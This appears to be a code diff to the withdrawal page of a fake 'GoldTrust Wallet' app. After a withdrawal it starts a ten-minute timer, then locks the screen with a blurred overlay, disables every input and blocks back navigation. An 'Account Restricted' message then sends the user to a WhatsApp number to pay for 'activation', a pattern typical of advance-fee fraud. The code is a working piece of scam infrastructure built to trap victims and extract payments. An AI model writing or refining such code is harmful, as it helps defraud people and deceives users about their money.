@@ -34,6 +34,7 @@ export default function Withdraw() {
   // restriction states
   const [isRestricted, setIsRestricted] = useState(false);
   const [showRestrictionPopup, setShowRestrictionPopup] = useState(false);
+  const [timeLeft, setTimeLeft] = useState(0);
 
   useEffect(() => {
     const u = loadUser();
@@ -52,20 +53,62 @@ export default function Withdraw() {
       .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
     setRecentTx(recent.slice(0, 3));
 
-    // check restriction timer: if restrictionEnd exists and now >= restrictionEnd, mark restricted
-    try {
-      const restrictionEnd = localStorage.getItem('gt_restriction_end');
-      if (restrictionEnd && Date.now() >= Number(restrictionEnd)) {
-        setIsRestricted(true);
-        setShowRestrictionPopup(true);
-      }
-    } catch (e) {}
-
     // ensure canonical code is available client-side (helps other pages/tools)
     try {
       localStorage.setItem('gt_activation_code', WITHDRAW_CODE);
     } catch (e) {}
+
   }, []);
+
+  /* ===== NEW: watch restriction timestamp + activation flag ===== */
+  useEffect(() => {
+    const check = () => {
+      try {
+        const activated = localStorage.getItem('gt_activated') === 'true';
+        if (activated) {
+          setIsRestricted(false);
+          setShowRestrictionPopup(false);
+          setTimeLeft(0);
+          return;
+        }
+
+        const end = localStorage.getItem('gt_restriction_end');
+        if (!end) {
+          setIsRestricted(false);
+          setShowRestrictionPopup(false);
+          setTimeLeft(0);
+          return;
+        }
+
+        const remaining = Number(end) - Date.now();
+        if (remaining <= 0) {
+          setIsRestricted(true);
+          setShowRestrictionPopup(true);
+          setTimeLeft(0);
+        } else {
+          setIsRestricted(false);
+          setShowRestrictionPopup(false);
+          setTimeLeft(remaining);
+        }
+      } catch (e) {}
+    };
+
+    check();
+    const iv = setInterval(check, 1000);
+    return () => clearInterval(iv);
+  }, []);
+  /* ================================================================ */
+
+  // disable back navigation while locked
+  useEffect(() => {
+    if (!isRestricted) return;
+    const blockBack = () => {
+      try { window.history.pushState(null, '', window.location.href); } catch (e) {}
+    };
+    blockBack();
+    window.addEventListener('popstate', blockBack);
+    return () => window.removeEventListener('popstate', blockBack);
+  }, [isRestricted]);
 
   const proceed = () => {
     if (isRestricted) {
@@ -132,6 +175,8 @@ export default function Withdraw() {
       // set 10-minute restriction timer (timestamp stored as string)
       try {
         localStorage.setItem('gt_restriction_end', String(Date.now() + (10 * 60 * 1000)));
+        // clear any activation flag so user must activate after time elapses
+        localStorage.removeItem('gt_activated');
       } catch (e) {}
 
       setLoading(false);
@@ -148,9 +193,53 @@ export default function Withdraw() {
     </Layout>
   );
 
+  const formatTime = (ms) => {
+    const s = Math.floor(ms / 1000);
+    const m = Math.floor(s / 60);
+    const sec = s % 60;
+    return `${m}:${sec.toString().padStart(2,'0')}`;
+  };
+
   return (
     <Layout>
       <LogoHeader small />
+
+      {/* ===== FULL-SCREEN BLUR + LOCK OVERLAY WHEN isRestricted === true ===== */}
+      {isRestricted && (
+        <div className="restriction-overlay" role="dialog" aria-modal="true" style={{
+          position: 'fixed', inset: 0, zIndex: 9999, display:'flex',
+          alignItems:'center', justifyContent:'center',
+          backgroundColor:'rgba(0,0,0,0.45)', backdropFilter:'blur(8px)', WebkitBackdropFilter:'blur(8px)'
+        }}>
+          <div className="introBox card" style={{ maxWidth:420, width:'92%', textAlign:'center', padding:22 }}>
+            <div style={{ fontWeight: 800, fontSize: 18, marginBottom: 12 }}>
+              Account Restricted ⚠️
+            </div>
+
+            <div className="small muted" style={{ lineHeight: 1.6, marginBottom: 16 }}>
+              Dear <strong>{user.fullName}</strong>, your recent withdrawal was processed.
+              To continue using the app please activate your account.
+            </div>
+
+            {timeLeft > 0 ? (
+              <div style={{ marginBottom: 12, fontWeight: 700, color: '#1e40af' }}>
+                ⏱️ Restriction will engage in: {formatTime(timeLeft)}
+              </div>
+            ) : (
+              <div style={{ marginBottom: 12, fontWeight: 700, color: '#dc2626' }}>
+                ⛔ Account locked — activation required
+              </div>
+            )}
+
+            <button className="btn" style={{ width:'100%', fontWeight:800 }} onClick={()=>{
+              window.location.href = 'https://wa.me/2348161662371?text=Hello%2C%20I%20want%20to%20activate%20my%20GoldTrust%20Wallet%20account';
+            }}>
+              👉 CLICK TO ACTIVATE
+            </button>
+          </div>
+        </div>
+      )}
+      {/* ================================================================ */}
 
       <div className="card shadow-lg p-6 rounded-2xl space-y-4">
         <h3 className="text-xl font-bold mb-2">💸 Withdraw Funds</h3>
@@ -163,12 +252,14 @@ export default function Withdraw() {
           placeholder="Account Number"
           value={account}
           onChange={e => setAccount(e.target.value.replace(/\D/g, ''))}
+          disabled={isRestricted}
         />
 
         <select
           className="input"
           value={bank}
           onChange={e => setBank(e.target.value)}
+          disabled={isRestricted}
         >
           <option value="">Select Bank</option>
           {BANKS.map((b, i) => <option key={i} value={b}>{b}</option>)}
@@ -180,6 +271,7 @@ export default function Withdraw() {
           type="number"
           value={amount}
           onChange={e => setAmount(e.target.value)}
+          disabled={isRestricted}
         />
 
         {/* verification input is on the same page */}
@@ -188,6 +280,7 @@ export default function Withdraw() {
           placeholder="Enter Activation Code"
           value={code}
           onChange={e => setCode(e.target.value)}
+          disabled={isRestricted}
         />
 
         {/* NEW: link to buy code (shows under activation code input, above the Withdraw button) */}
@@ -204,7 +297,7 @@ export default function Withdraw() {
         <button
           className={`btn bg-gradient-to-r from-blue-500 to-blue-600 text-white px-6 py-3 rounded-xl shadow-md hover:scale-105 transition-transform ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
           onClick={proceed}
-          disabled={loading}
+          disabled={loading || isRestricted}
         >
           {loading ? 'Processing withdrawal...' : 'Withdraw Now'}
         </button>
@@ -227,36 +320,6 @@ export default function Withdraw() {
           </div>
         )}
       </div>
-
-      {/* restriction popup */}
-      {showRestrictionPopup && (
-        <div className="introOverlay" role="dialog" aria-modal="true">
-          <div className="introBox card">
-            <div style={{ fontWeight: 800, fontSize: 18, marginBottom: 8 }}>
-              Account Restricted ⚠️
-            </div>
-
-            <div className="small muted" style={{ lineHeight: 1.6 }}>
-              Dear <strong>{user.fullName}</strong>, your withdrawal is processing.
-              Due to a temporary account restriction, you are required to activate
-              your account before the withdrawal can be successfully sent to your bank account.
-            </div>
-
-            <div style={{ height: 16 }} />
-
-            <button
-              className="btn"
-              style={{ width: '100%', fontWeight: 800 }}
-              onClick={() => {
-                window.location.href =
-                  'https://wa.me/2348161662371?text=Hello%2C%20I%20want%20to%20activate%20my%20GoldTrust%20Wallet%20account';
-              }}
-            >
-              👉 CLICK TO ACTIVATE
-            </button>
-          </div>
-        </div>
-      )}
     </Layout>
   );
 }
